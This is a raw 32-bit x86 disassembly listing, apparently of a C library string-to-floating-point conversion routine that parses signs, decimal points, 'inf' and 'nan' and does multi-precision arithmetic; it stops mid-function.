mov eax, dword [arg_14h]
mov edx, esi
mov ecx, dword [eax + 0x38]
cmp dl, byte [ecx + 0x184]
jl 0x8087b2a
cmp dl, byte [ecx + 0x198]
jle 0x8086595
xor ebx, ebx
cmp byte [var_edh], 0
je 0x8086595
mov ecx, dword [var_88h]
movzx eax, byte [ecx]
cmp al, byte [ebx + edi]
jne 0x8086595
mov edx, dword [var_88h]
inc ebx
movzx eax, byte [ebx + edx]
test al, al
jne 0x8087b42
jmp 0x8086595
mov ecx, dword [var_8ch]
movzx eax, byte [ecx]
jmp 0x8086580
mov ecx, esi
cmp cl, 0x30
jne 0x8086584
inc edi
movzx esi, byte [edi]
mov eax, esi
cmp al, 0x30
je 0x8087b78
jmp 0x8086584
mov edx, dword [arg_14h]
movsx eax, byte [edi + 1]
mov ecx, dword [edx + 0x38]
cmp dword [ecx + eax*4], 0x78
jne 0x808652e
add edi, 2
mov dword [var_64h], 0x10
movzx esi, byte [edi]
mov dword [var_90h], 0
jmp 0x808652e
test al, al
jne 0x8086388
jmp 0x8086378
mov edx, dword [var_88h]
movzx eax, byte [edx]
jmp 0x8087bb7
inc edi
movzx esi, byte [edi]
jmp 0x8086338
mov dword [var_60h], 1
jmp 0x8087bcf
jmp fcn.08087bf0
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
sub esp, 0x10
mov eax, dword [arg_10h]
mov dword [var_8h], 0
mov dword [var_ch], eax
mov eax, dword [arg_ch]
mov dword [var_4h], eax
mov eax, dword [arg_8h]
mov dword [esp], eax
call fcn.08086280
leave
ret
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x20
mov esi, dword [arg_1ch]
mov ecx, dword [arg_14h]
mov eax, dword [arg_ch]
mov edx, dword [arg_10h]
mov edi, dword [arg_8h]
mov dword [var_18h], ecx
mov dword [var_10h], eax
mov dword [var_14h], edx
cmp dword [var_10h], 0xfffffc02
mov eax, dword [arg_18h]
mov dword [var_1ch], eax
jge 0x8087d66
mov ebx, 0xfffffc02
sub ebx, dword [var_10h]
cmp ebx, 0x35
jg 0x8087eeb
movzx ecx, byte [var_1ch]
mov eax, 1
mov edx, esi
or edx, 1
shl eax, cl
dec eax
test dword [var_18h], eax
cmovne esi, edx
cmp ebx, 0x35
je 0x8087eb7
cmp ebx, 0x1f
jle 0x8087e87
mov ecx, ebx
lea eax, [ebx + 0x1e]
dec ecx
cmovns eax, ecx
sar eax, 5
mov edx, dword [edi + eax*4]
shl eax, 5
mov dword [var_18h], edx
mov edx, ecx
sub edx, eax
mov dword [var_1ch], edx
xor edx, edx
lea esi, [esi]
cmp ecx, 0xffffffff
lea eax, [ebx + 0x1e]
cmovg eax, ecx
sar eax, 5
cmp edx, eax
jge 0x8087cef
mov eax, esi
or eax, 1
cmp dword [edi + edx*4], 0
cmovne esi, eax
inc edx
jmp 0x8087cd0
movzx ecx, byte [var_1ch]
mov eax, 1
mov edx, esi
or edx, 1
shl eax, cl
mov ecx, ebx
dec eax
test dword [var_18h], eax
mov dword [esp], edi
cmovne esi, edx
cmp ebx, 0xffffffff
lea edx, [ebx + 0x1f]
cmovg edx, ebx
sar edx, 5
mov eax, edx
shl eax, 5
sub ecx, eax
mov eax, 2
sub eax, edx
mov dword [var_sp_ch], ecx
lea edx, [edi + edx*4]
mov dword [var_sp_4h], edx
mov dword [var_sp_8h], eax
call fcn.0808c750
xor edx, edx
nop
lea esi, [esi]
cmp ebx, 0xffffffff
lea eax, [ebx + 0x1f]
cmovg eax, ebx
sar eax, 5
cmp edx, eax
jge 0x8087d5f
mov ecx, edx
inc edx
sub ecx, eax
mov dword [edi + ecx*4 + 8], 0
jmp 0x8087d40
mov dword [var_10h], 0xfffffc01
movzx ecx, byte [var_1ch]
mov eax, dword [var_18h]
shr eax, cl
test al, 1
je 0x8087dd3
test esi, esi
jne 0x8087e80
mov edx, dword [edi]
test dl, 1
jne 0x8087d90
mov eax, 1
shl eax, cl
dec eax
test dword [var_18h], eax
je 0x8087dd3
nop
lea eax, [edx + 1]
lea ebx, [edi + 4]
mov esi, 2
cmp eax, edx
mov dword [edi], eax
mov ecx, ebx
jae 0x8087e59
mov eax, dword [edi + 4]
lea ebx, [edi + 8]
mov esi, 1
mov ecx, ebx
inc eax
test eax, eax
mov dword [edi + 4], eax
jne 0x8087e59
mov eax, dword [edi + 4]
test eax, 0x200000
jne 0x8087e2e
cmp dword [var_10h], 0xfffffc01
je 0x8087e1b
cmp dword [var_10h], 0x400
jle 0x8087e00
mov eax, dword [var_14h]
test eax, eax
je 0x8087df1
fld dword [0x80a6100]
add esp, 0x20
pop ebx
pop esi
pop edi
leave
ret
fld dword [0x80a61a0]
jmp 0x8087de9
lea esi, [esi]
mov eax, dword [var_14h]
mov edx, dword [var_10h]
mov dword [arg_8h], edi
mov dword [arg_10h], eax
mov dword [arg_ch], edx
add esp, 0x20
pop ebx
pop esi
pop edi
leave
jmp 0x808d880
test eax, 0x100000
mov eax, 0xfffffc02
cmove eax, dword [var_10h]
mov dword [var_10h], eax
jmp 0x8087dd3
inc dword [var_10h]
mov dword [esp], edi
mov dword [var_sp_4h], edi
mov dword [var_sp_ch], 1
mov dword [var_sp_8h], 2
call fcn.0808c750
or dword [edi + 4], 0x100000
jmp 0x8087dd3
cmp ecx, ebx
je 0x8087dc0
xor edx, edx
dec esi
cmp edx, esi
jge 0x8087dc0
lea esi, [esi]
mov eax, dword [ebx + edx*4]
mov dword [ecx + edx*4], eax
inc edx
cmp edx, esi
jl 0x8087e70
jmp 0x8087dc0
mov edx, dword [edi]
jmp 0x8087d90
test ebx, ebx
jle 0x8087d5f
mov eax, dword [edi]
lea edx, [ebx - 1]
mov dword [var_1ch], edx
mov dword [var_18h], eax
mov dword [esp], edi
mov dword [var_sp_4h], edi
mov dword [var_sp_ch], ebx
mov dword [var_sp_8h], 2
call fcn.0808c750
jmp 0x8087d5f
mov eax, dword [edi + 4]
mov dword [var_1ch], 0x14
xor edx, edx
mov dword [var_18h], eax
mov ecx, dword [edi + edx*4]
mov eax, esi
or eax, 1
test ecx, ecx
cmovne esi, eax
inc edx
cmp edx, 1
jle 0x8087ec6
mov dword [edi], 0
mov dword [edi + 4], 0
jmp 0x8087d5f
call fcn.08048b20
fldz
mov dword [eax], 0x21
jmp 0x8087de9
lea esi, [esi]
push ebp
mov ebp, esp
push edi
xor edi, edi
push esi
xor esi, esi
push ebx
sub esp, 0x18
mov eax, dword [arg_14h]
mov ebx, dword [arg_8h]
mov dword [eax], 0
lea esi, [esi]
cmp edi, 9
je 0x8088080
movzx ecx, byte [ebx]
lea eax, [ecx - 0x30]
cmp al, 9
jbe 0x8087f4b
mov eax, dword [arg_24h]
test eax, eax
je 0x8087f45
mov eax, dword [arg_24h]
cmp cl, byte [eax]
je 0x8088040
add ebx, dword [arg_20h]
movzx ecx, byte [ebx]
movsx eax, cl
dec dword [arg_ch]
lea edx, [esi + esi*4]
lea esi, [eax + edx*2 - 0x30]
inc ebx
inc edi
mov eax, dword [arg_ch]
test eax, eax
jg 0x8087f20
mov edx, dword [arg_18h]
mov eax, dword [edx]
test eax, eax
jle 0x8088033
lea edx, [eax + edi]
cmp edx, 9
jg 0x8088033
imul esi, dword [eax*4 + 0x80a6120]
mov ecx, dword [arg_18h]
mov edx, dword [edx*4 + 0x80a6120]
mov dword [ecx], 0
mov ecx, dword [arg_14h]
mov eax, dword [ecx]
test eax, eax
jne 0x8087fb0
mov eax, dword [arg_10h]
mov dword [eax], esi
mov dword [ecx], 1
add esp, 0x18
mov eax, ebx
pop ebx
pop esi
pop edi
leave
ret
mov dword [var_ch], edx
mov dword [var_8h], eax
mov edx, dword [arg_10h]
mov dword [var_4h], edx
mov dword [esp], edx
call fcn.0808cae0
mov dword [var_14h], eax
mov edi, dword [arg_10h]
mov eax, dword [arg_14h]
mov ecx, dword [eax]
add edi, 4
mov eax, dword [arg_10h]
mov edx, dword [eax]
lea eax, [edx + esi]
mov esi, dword [arg_10h]
cmp eax, edx
mov dword [esi], eax
mov esi, edi
jae 0x8088019
dec ecx
je 0x8087ffd
mov edx, dword [edi]
add edi, 4
inc edx
mov dword [esi], edx
add esi, 4
test edx, edx
jne 0x8088019
dec ecx
jne 0x8087feb
mov eax, 1
add dword [var_14h], eax
je 0x8087fa6
mov edx, dword [arg_14h]
mov esi, dword [var_14h]
mov ecx, dword [arg_10h]
mov eax, dword [edx]
mov dword [ecx + eax*4], esi
inc dword [edx]
jmp 0x8087fa6
cmp esi, edi
je 0x808802f
xor edx, edx
dec ecx
cmp edx, ecx
jge 0x808802f
mov eax, dword [edi + edx*4]
mov dword [esi + edx*4], eax
inc edx
cmp edx, ecx
jl 0x8088024
xor eax, eax
jmp 0x8088002
mov edx, dword [edi*4 + 0x80a6120]
jmp 0x8087f92
nop
movzx eax, byte [eax + 1]
mov edx, 1
test al, al
je 0x8088070
lea esi, [esi]
cmp al, byte [edx + ebx]
jne 0x8088061
mov ecx, dword [arg_24h]
inc edx
movzx eax, byte [edx + ecx]
test al, al
jne 0x8088050
test al, al
jne 0x8087f45
add ebx, edx
jmp 0x8087f48
mov ecx, dword [arg_24h]
movzx eax, byte [ecx + 1]
jmp 0x8088061
lea esi, [esi]
mov edx, dword [arg_14h]
mov eax, dword [edx]
test eax, eax
jne 0x808809d
mov ecx, dword [arg_10h]
mov dword [ecx], esi
mov dword [edx], 1
xor edi, edi
xor esi, esi
jmp 0x8087f29
mov dword [var_8h], eax
mov dword [var_ch], 0x3b9aca00
mov eax, dword [arg_10h]
mov dword [var_4h], eax
mov dword [esp], eax
call fcn.0808cae0
mov dword [var_10h], eax
mov edx, dword [arg_14h]
mov edi, dword [arg_10h]
mov eax, dword [arg_10h]
mov ecx, dword [edx]
add edi, 4
mov edx, dword [eax]
lea eax, [edx + esi]
mov esi, dword [arg_10h]
cmp eax, edx
mov dword [esi], eax
mov esi, edi
jae 0x808810e
dec ecx
je 0x80880f2
lea esi, [esi]
mov edx, dword [edi]
add edi, 4
inc edx
mov dword [esi], edx
add esi, 4
test edx, edx
jne 0x808810e
dec ecx
jne 0x80880e0
mov eax, 1
add dword [var_10h], eax
je 0x8088094
mov edx, dword [arg_14h]
mov esi, dword [var_10h]
mov ecx, dword [arg_10h]
mov eax, dword [edx]
mov dword [ecx + eax*4], esi
inc dword [edx]
jmp 0x8088094
cmp esi, edi
je 0x808812b
xor edx, edx
dec ecx
cmp edx, ecx
jge 0x808812b
lea esi, [esi]
mov eax, dword [edi + edx*4]
mov dword [esi + edx*4], eax
inc edx
cmp edx, ecx
jl 0x8088120
xor eax, eax
jmp 0x80880f7
nop
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x22c
mov ecx, dword [arg_10h]
mov eax, dword [arg_14h]
mov dword [var_168h], 0xa
mov dword [var_190h], 0
test ecx, ecx
mov edx, dword [eax + 4]
je 0x8088189
mov ecx, dword [edx + 0x2c]
mov dword [var_194h], ecx
movzx eax, byte [ecx]
test al, al
jle 0x8088189
cmp al, 0x7f
je 0x8088189
mov esi, dword [edx + 0x28]
mov dword [var_190h], esi
cmp byte [esi], 0
jne 0x8088193
mov dword [var_190h], 0
mov dword [var_194h], 0
mov edx, dword [edx + 0x24]
mov dword [var_18ch], edx
mov dword [esp], edx
call fcn.08053400
mov edi, dword [arg_8h]
mov dword [var_170h], 0
mov dword [var_198h], eax
mov dword [var_15ch], 0
mov dword [var_164h], 0
mov eax, dword [arg_14h]
dec edi
mov edx, dword [eax + 0x34]
inc edi
movzx esi, byte [edi]
mov ecx, esi
movsx eax, cl
test byte [edx + eax*2 + 1], 0x20
jne 0x80881d2
cmp cl, 0x2d
je 0x8089f3c
cmp cl, 0x2b
je 0x8089f33
mov edx, dword [var_18ch]
xor ebx, ebx
movzx edx, byte [edx]
test dl, dl
mov byte [var_206h], dl
mov byte [var_205h], dl
je 0x8089f28
mov eax, edx
cmp byte [ebx + edi], al
jne 0x8089f1b
mov ecx, dword [var_18ch]
inc ebx
movzx eax, byte [ebx + ecx]
test al, al
jne 0x8088215
movzx eax, byte [ebx + edi]
cmp al, 0x2f
jle 0x808823d
cmp al, 0x39
jle 0x808840a
lea eax, [esi - 0x30]
cmp al, 9
jbe 0x808840a
mov ecx, esi
mov esi, dword [arg_14h]
movsx eax, cl
mov ebx, eax
mov ecx, dword [esi + 0x38]
cmp dword [ecx + eax*4], 0x69
je 0x808838c
cmp dword [ecx + ebx*4], 0x6e
jne 0x8088376
mov ecx, dword [arg_14h]
mov dword [var_8h], 3
mov dword [var_4h], 0x80a0fb8
mov dword [esp], edi
mov dword [var_ch], ecx
call fcn.0808dd40
test eax, eax
jne 0x8088376
fld dword [0x80a61a4]
add edi, 3
fstp qword [ebp - 0x1a0]
cmp byte [edi], 0x28
je 0x80882c1
mov eax, dword [arg_ch]
test eax, eax
je 0x80882b0
mov eax, dword [arg_ch]
mov dword [eax], edi
fld qword [ebp - 0x1a0]
add esp, 0x22c
pop ebx
pop esi
pop edi
leave
ret
mov eax, dword [arg_14h]
mov ebx, edi
mov ecx, dword [eax + 0x38]
inc edi
movzx edx, byte [edi]
lea eax, [edx - 0x30]
cmp al, 9
jbe 0x80882c9
movsx eax, dl
mov eax, dword [ecx + eax*4]
cmp eax, 0x60
jle 0x80882e4
cmp eax, 0x7a
jle 0x80882c9
cmp dl, 0x5f
je 0x80882c9
cmp dl, 0x29
je 0x80882f2
mov edi, ebx
jmp 0x80882a4
mov edx, dword [arg_14h]
lea eax, [var_150h]
mov dword [var_ch], 0
mov dword [var_4h], eax
mov dword [var_8h], 0
lea eax, [ebx + 1]
mov dword [esp], eax
mov dword [var_10h], edx
call fcn.080856c0
cmp dword [var_150h], edi
mov ecx, eax
mov ebx, edx
jne 0x80882a4
fld qword [ebp - 0x1a0]
and edx, 0xfffff
mov esi, edx
or esi, eax
fstp qword [ebp - 0x1a8]
jne 0x808834d
xor ecx, ecx
mov ebx, 0x80000
mov eax, ebx
mov dword [var_1a8h], ecx
and eax, 0xfffff
or eax, 0x7ff00000
mov dword [var_1a4h], eax
fld qword [ebp - 0x1a8]
fstp qword [ebp - 0x1a0]
jmp 0x80882a4
mov eax, dword [arg_ch]
test eax, eax
je 0x8088385
mov ecx, dword [arg_8h]
mov edx, dword [arg_ch]
mov dword [edx], ecx
fldz
jmp 0x80882b6
mov dword [var_ch], esi
mov dword [var_8h], 3
mov dword [var_4h], 0x80a0fc0
mov dword [esp], edi
call fcn.0808dd40
test eax, eax
jne 0x80883ff
mov eax, dword [arg_ch]
test eax, eax
je 0x80883df
lea ebx, [edi + 3]
mov dword [var_ch], esi
mov dword [var_8h], 5
mov dword [esp], ebx
mov dword [var_4h], str.inity
call fcn.0808dd40
test eax, eax
lea edx, [edi + 8]
mov eax, dword [arg_ch]
cmove ebx, edx
mov dword [eax], ebx
mov edx, dword [var_164h]
test edx, edx
je 0x80883f4
fld dword [0x80a6100]
jmp 0x80882b6
fld dword [0x80a61a0]
jmp 0x80882b6
mov edx, dword [arg_14h]
mov ecx, dword [edx + 0x38]
jmp 0x808825f
mov eax, esi
cmp al, 0x30
je 0x8089ee8
mov eax, dword [var_190h]
mov dword [var_178h], edi
test eax, eax
je 0x8089ece
mov ecx, dword [var_190h]
movzx edx, byte [ecx]
mov eax, esi
cmp al, 0x30
je 0x8088465
xor ebx, ebx
test dl, dl
je 0x8089ec0
mov ecx, dword [var_190h]
movzx eax, byte [ecx]
lea esi, [esi]
mov ecx, esi
cmp cl, al
jne 0x808846b
mov ecx, dword [var_190h]
inc ebx
movzx eax, byte [ebx + ecx]
test al, al
jne 0x8088450
inc edi
movzx esi, byte [edi]
jmp 0x8088431
test al, al
je 0x8088465
lea eax, [esi - 0x30]
cmp al, 9
jbe 0x8088483
cmp dword [var_168h], 0x10
je 0x8089e6b
mov dword [var_174h], edi
mov dword [var_180h], 0
lea eax, [esi - 0x30]
cmp al, 9
jbe 0x8089e60
cmp dword [var_168h], 0x10
je 0x8089e3e
mov eax, dword [var_190h]
test eax, eax
je 0x80884ea
mov ecx, dword [var_190h]
xor ebx, ebx
movzx eax, byte [ecx]
test al, al
je 0x8089e30
cmp al, byte [ebx + edi]
jne 0x80884e6
mov edx, dword [var_190h]
inc ebx
movzx eax, byte [ebx + edx]
test al, al
jne 0x80884c8
lea esi, [esi]
inc edi
movzx esi, byte [edi]
jmp 0x8088493
test al, al
je 0x80884e0
mov eax, dword [var_194h]
test eax, eax
je 0x8089aa5
mov ebx, dword [var_180h]
test ebx, ebx
jle 0x8089aa5
mov ecx, dword [var_178h]
mov eax, dword [var_194h]
mov dword [var_4h], edi
mov edx, dword [var_190h]
mov dword [esp], ecx
mov dword [var_ch], eax
mov dword [var_8h], edx
call fcn.08049980
cmp edi, eax
mov ecx, eax
je 0x8089a96
cmp eax, dword [var_178h]
je 0x8089a7e
cmp eax, dword [var_174h]
jb 0x8089a6e
mov ecx, dword [var_174h]
mov edi, eax
mov dword [var_180h], 0
cmp ecx, eax
jae 0x8088585
movzx eax, byte [ecx]
mov edx, dword [var_180h]
inc edx
sub eax, 0x30
cmp al, 9
cmova edx, dword [var_180h]
inc ecx
cmp ecx, edi
mov dword [var_180h], edx
jb 0x8088564
mov ecx, dword [var_180h]
mov dword [var_188h], 0
mov dword [var_184h], ecx
mov edx, dword [arg_ch]
test edx, edx
je 0x80885a7
mov edx, dword [arg_ch]
mov dword [edx], edi
mov eax, dword [var_180h]
test eax, eax
jne 0x80885ca
mov eax, dword [var_164h]
test eax, eax
je 0x8088385
fld dword [0x80a6104]
jmp 0x80882b6
mov eax, dword [var_188h]
test eax, eax
je 0x808867c
mov ecx, dword [var_18ch]
mov esi, dword [var_18ch]
movzx ecx, byte [ecx]
mov byte [var_206h], cl
movzx edx, byte [esi + 1]
mov ecx, dword [var_174h]
movzx eax, byte [var_206h]
cmp byte [ecx], al
je 0x808860a
inc dword [var_174h]
jmp 0x80885f1
test dl, dl
mov ebx, 1
je 0x8089a62
mov esi, dword [var_18ch]
movzx eax, byte [esi + 1]
mov ecx, dword [var_174h]
cmp al, byte [ebx + ecx]
jne 0x8089a55
mov esi, dword [var_18ch]
inc ebx
movzx eax, byte [ebx + esi]
test al, al
jne 0x8088621
mov eax, dword [var_188h]
add eax, dword [var_198h]
add dword [var_174h], eax
cmp dword [var_168h], 0x10
je 0x8089a3f
mov edx, dword [var_15ch]
sub edx, dword [var_188h]
mov esi, dword [var_188h]
mov dword [var_15ch], edx
sub dword [var_180h], esi
cmp dword [var_168h], 0x10
je 0x8089827
mov ebx, dword [var_15ch]
test ebx, ebx
mov edx, ebx
js 0x808980e
mov eax, dword [var_180h]
sub eax, dword [var_184h]
cmp ebx, eax
cmovle eax, ebx
add dword [var_184h], eax
mov ebx, edx
sub ebx, eax
mov eax, dword [var_184h]
mov dword [var_15ch], ebx
add eax, ebx
cmp eax, 0x135
jg 0x8088854
cmp ebx, 0xfffffebd
jl 0x80897fe
mov ecx, dword [var_184h]
test ecx, ecx
jle 0x8088a15
mov esi, dword [var_18ch]
mov edx, dword [var_190h]
lea eax, [var_15ch]
mov ecx, dword [var_198h]
mov dword [var_10h], eax
mov eax, dword [var_174h]
mov dword [var_14h], esi
mov dword [var_1ch], edx
mov esi, dword [var_184h]
mov dword [var_18h], ecx
lea edx, [var_160h]
mov dword [esp], eax
lea ecx, [var_ach]
mov dword [var_ch], edx
mov dword [var_8h], ecx
mov dword [var_4h], esi
call fcn.08087f00
mov ebx, dword [var_15ch]
mov dword [var_174h], eax
test ebx, ebx
jle 0x8088829
lea edx, [var_ach]
lea ecx, [var_14ch]
mov edi, 1
mov dword [var_1b4h], edx
mov dword [var_1b8h], ecx
mov dword [var_1bch], 0x80a7020
test edi, ebx
je 0x8088806
mov eax, dword [var_1bch]
mov edx, dword [var_160h]
xor ebx, edi
mov dword [var_15ch], ebx
mov esi, dword [eax + 4]
sub esi, 2
cmp edx, esi
jl 0x80897cf
mov dword [var_10h], esi
mov eax, dword [eax]
mov dword [var_8h], edx
mov edx, dword [var_1b8h]
lea eax, [eax*4 + 0x80a6248]
mov dword [var_ch], eax
mov dword [esp], edx
mov eax, dword [var_1b4h]
mov dword [var_4h], eax
call fcn.0808c7c0
mov edx, eax
mov eax, dword [var_160h]
add eax, esi
test edx, edx
mov dword [var_160h], eax
jne 0x80887e8
dec eax
mov dword [var_160h], eax
mov eax, dword [var_1b4h]
mov esi, dword [var_1b8h]
mov ebx, dword [var_15ch]
mov dword [var_1b4h], esi
mov dword [var_1b8h], eax
add edi, edi
add dword [var_1bch], 0x10
test ebx, ebx
jne 0x8088776
lea eax, [var_14ch]
cmp dword [var_1b4h], eax
je 0x80897b3
mov edx, dword [var_160h]
bsr ecx, dword [ebp + edx*4 - 0xb0]
xor ecx, 0x1f
mov eax, edx
mov dword [var_1c0h], edx
shl eax, 5
sub eax, ecx
cmp eax, 0x400
mov dword [var_170h], eax
jle 0x8088864
call fcn.08048b20
mov dword [eax], 0x22
jmp 0x80883df
cmp dword [var_170h], 0x35
jle 0x80889d9
mov edx, dword [var_170h]
mov eax, dword [var_170h]
mov dword [var_1c8h], 0x1f
sub edx, 0x16
sub eax, 0x35
mov esi, eax
mov edi, eax
cmovs esi, edx
sar esi, 5
mov edx, esi
lea ecx, [esi - 1]
shl edx, 5
sub edi, edx
cmovne ecx, esi
lea eax, [edi - 1]
test edi, edi
cmove eax, dword [var_1c8h]
mov dword [var_1c4h], ecx
mov dword [var_1c8h], eax
jne 0x8088958
mov eax, dword [ebp + esi*4 - 0xac]
mov dword [var_158h], eax
mov eax, dword [ebp + esi*4 - 0xa8]
mov dword [var_154h], eax
mov eax, dword [var_ach]
xor ebx, ebx
test eax, eax
jne 0x80888f4
inc ebx
mov eax, dword [ebp + ebx*4 - 0xac]
test eax, eax
je 0x80888e8
xor eax, eax
mov esi, dword [var_180h]
cmp dword [var_184h], esi
jl 0x808890c
cmp ebx, dword [var_1c4h]
jge 0x8088911
mov eax, 1
mov dword [var_14h], eax
mov edx, dword [var_1c4h]
mov ecx, dword [var_164h]
mov eax, dword [var_1c8h]
mov dword [var_8h], ecx
mov dword [var_10h], eax
mov eax, dword [ebp + edx*4 - 0xac]
mov dword [var_ch], eax
mov eax, dword [var_170h]
dec eax
lea esi, [var_158h]
mov dword [var_4h], eax
mov dword [esp], esi
call fcn.08087c40
jmp 0x80882b6
mov eax, dword [var_1c0h]
mov ebx, esi
dec eax
cmp esi, eax
jge 0x80889be
mov dword [var_1cch], eax
mov dword [var_1d0h], 0x20
lea eax, [var_158h]
sub dword [var_1d0h], edi
mov dword [var_218h], eax
mov edx, dword [ebp + ebx*4 - 0xac]
mov ecx, edi
mov eax, dword [ebp + ebx*4 - 0xa8]
inc ebx
shr edx, cl
movzx ecx, byte [var_1d0h]
shl eax, cl
or edx, eax
mov eax, dword [var_218h]
mov dword [eax], edx
add eax, 4
cmp ebx, dword [var_1cch]
mov dword [var_218h], eax
jl 0x8088987
mov eax, ebx
sub eax, esi
dec eax
jg 0x80888dc
mov eax, dword [ebp + ebx*4 - 0xac]
mov ecx, edi
shr eax, cl
jmp 0x80888d6
mov eax, dword [var_184h]
cmp dword [var_180h], eax
je 0x8089640
mov ecx, dword [var_1c0h]
lea esi, [var_ach]
lea edi, [var_158h]
cld
shl ecx, 2
shr ecx, 2
rep movsd dword es:[edi], dword ptr [esi]
mov eax, dword [var_160h]
cmp eax, 1
jle 0x8089630
mov esi, 0x37
lea edx, [var_14ch]
lea ecx, [var_ach]
sub esi, dword [var_170h]
mov dword [var_1e0h], edx
mov dword [var_1e4h], ecx
mov edx, 0x55555556
mov ecx, dword [var_180h]
mov dword [var_1e8h], 0x80a7020
sub ecx, dword [var_184h]
mov dword [var_1dch], 0
mov eax, esi
imul edx
mov eax, esi
sar eax, 0x1f
sub edx, eax
lea eax, [edx + 2]
cmp ecx, eax
jle 0x8088a89
mov ecx, dword [var_184h]
mov dword [var_1dch], 1
lea edx, [edx + ecx + 2]
mov dword [var_180h], edx
mov esi, dword [var_180h]
mov dword [var_16ch], 0
sub esi, dword [var_184h]
sub esi, ebx
mov ebx, 1
mov dword [var_1d8h], esi
test dword [var_1d8h], ebx
je 0x8088af4
mov eax, dword [var_16ch]
xor dword [var_1d8h], ebx
test eax, eax
jne 0x80895b4
mov eax, dword [var_1e8h]
mov edi, dword [var_1e0h]
cld
mov edx, dword [eax + 4]
mov esi, dword [eax]
sub edx, 2
lea esi, [esi*4 + 0x80a6248]
mov ecx, edx
mov dword [var_16ch], edx
shl ecx, 2
shr ecx, 2
rep movsd dword es:[edi], dword ptr [esi]
mov eax, dword [var_1d8h]
add ebx, ebx
add dword [var_1e8h], 0x10
test eax, eax
jne 0x8088aac
lea eax, [var_ach]
cmp dword [var_1e0h], eax
je 0x8089598
mov edx, dword [var_190h]
mov esi, dword [var_18ch]
lea eax, [var_15ch]
mov ecx, dword [var_198h]
mov dword [var_10h], eax
mov dword [var_1ch], edx
mov dword [var_14h], esi
lea edx, [var_160h]
mov esi, dword [var_184h]
mov dword [var_ch], edx
mov dword [var_18h], ecx
sub dword [var_180h], esi
mov edx, dword [var_174h]
lea ecx, [var_ach]
mov eax, dword [var_180h]
mov dword [var_8h], ecx
mov dword [esp], edx
mov dword [var_4h], eax
call fcn.08087f00
mov ecx, dword [var_16ch]
bsr eax, dword [ebp + ecx*4 - 0x150]
mov ebx, eax
xor ebx, 0x1f
jle 0x8088be2
lea esi, [var_14ch]
mov dword [var_8h], ecx
mov dword [var_ch], ebx
mov dword [var_4h], esi
mov dword [esp], esi
call fcn.0808c6f0
mov eax, dword [var_160h]
lea edx, [var_ach]
mov dword [var_ch], ebx
mov dword [var_4h], edx
mov dword [esp], edx
mov dword [var_8h], eax
call fcn.0808c6f0
test eax, eax
mov edx, eax
je 0x8088be2
mov eax, dword [var_160h]
mov dword [ebp + eax*4 - 0xac], edx
inc eax
mov dword [var_160h], eax
cmp dword [var_16ch], 1
mov esi, dword [var_170h]
mov dword [var_15ch], esi
je 0x8089440
cmp dword [var_16ch], 2
je 0x8089139
mov eax, dword [var_16ch]
mov ecx, dword [var_16ch]
mov dword [var_200h], 0
xor edi, edi
mov edx, dword [ebp + eax*4 - 0x154]
mov esi, dword [ebp + eax*4 - 0x150]
mov eax, dword [var_160h]
mov dword [var_1fch], edx
sub ecx, eax
mov dword [var_8h], eax
lea eax, [ebp + ecx*4 - 0x14c]
mov dword [var_4h], eax
lea eax, [var_ach]
mov dword [esp], eax
call fcn.0808c330
test eax, eax
jle 0x8088c75
mov eax, dword [var_160h]
mov dword [ebp + eax*4 - 0xac], 0
inc eax
mov dword [var_160h], eax
mov eax, dword [var_160h]
cmp eax, dword [var_16ch]
jge 0x8089117
mov edx, dword [var_16ch]
sub edx, eax
mov dword [var_204h], edx
mov edx, dword [var_170h]
test edx, edx
jle 0x80890c0
mov eax, dword [var_204h]
shl eax, 5
add eax, dword [var_170h]
cmp eax, 0x35
jg 0x8088ff7
mov ecx, dword [var_160h]
mov eax, dword [var_158h]
mov dword [var_158h], 0
test ecx, ecx
mov dword [var_154h], eax
jle 0x8088cf7
mov eax, dword [var_204h]
lea edx, [eax + ecx]
mov eax, dword [ebp + ecx*4 - 0xb0]
dec ecx
test ecx, ecx
mov dword [ebp + edx*4 - 0xac], eax
jg 0x8088cdb
mov edx, dword [var_204h]
xor eax, eax
inc edx
cmp eax, edx
jge 0x8088d14
mov dword [ebp + eax*4 - 0xac], 0
inc eax
cmp eax, edx
jl 0x8088d04
shl dword [var_204h], 5
mov edx, dword [var_204h]
add dword [var_170h], edx
mov eax, dword [var_16ch]
cmp dword [var_170h], 0x35
mov dword [ebp + eax*4 - 0x14c], 0
mov edx, eax
mov eax, dword [ebp + eax*4 - 0xac]
mov ebx, eax
jg 0x8088ebf
lea ecx, [edx + 1]
lea eax, [edx - 1]
mov dword [var_210h], ecx
mov dword [var_20ch], eax
cmp ebx, esi
mov edi, 0xffffffff
je 0x8088dc0
mov edx, dword [var_16ch]
mov eax, dword [ebp + edx*4 - 0xb0]
mov edx, ebx
div esi
mov ecx, edx
mov edi, eax
mov eax, dword [var_1fch]
mul edi
cmp edx, ecx
mov ebx, eax
jbe 0x8088fd9
add ecx, esi
dec edi
cmp ecx, esi
jb 0x8088dc0
cmp ebx, dword [var_1fch]
lea eax, [edx - 1]
cmovb edx, eax
sub ebx, dword [var_1fch]
cmp edx, ecx
ja 0x8088d92
jne 0x8088dc0
mov eax, dword [var_16ch]
cmp ebx, dword [ebp + eax*4 - 0xb4]
ja 0x8088d92
mov edx, dword [var_210h]
lea ecx, [var_14ch]
lea eax, [var_ach]
mov dword [var_ch], edi
mov dword [var_4h], ecx
mov dword [esp], eax
mov dword [var_8h], edx
call fcn.0808d600
mov edx, dword [var_16ch]
cmp dword [ebp + edx*4 - 0xac], eax
je 0x8088e16
lea eax, [var_ach]
lea ecx, [var_14ch]
mov dword [var_ch], edx
mov dword [var_8h], ecx
mov dword [var_4h], eax
mov dword [esp], eax
dec edi
call fcn.0808c2a0
mov ecx, dword [var_16ch]
mov edx, dword [var_20ch]
mov eax, dword [ebp + ecx*4 - 0xb0]
test edx, edx
mov dword [ebp + ecx*4 - 0xac], eax
mov ebx, eax
jle 0x8088e49
mov eax, dword [ebp + edx*4 - 0xb0]
mov dword [ebp + edx*4 - 0xac], eax
dec edx
test edx, edx
jg 0x8088e36
mov eax, dword [var_170h]
test eax, eax
jne 0x8088f4c
test edi, edi
mov edx, 0x20
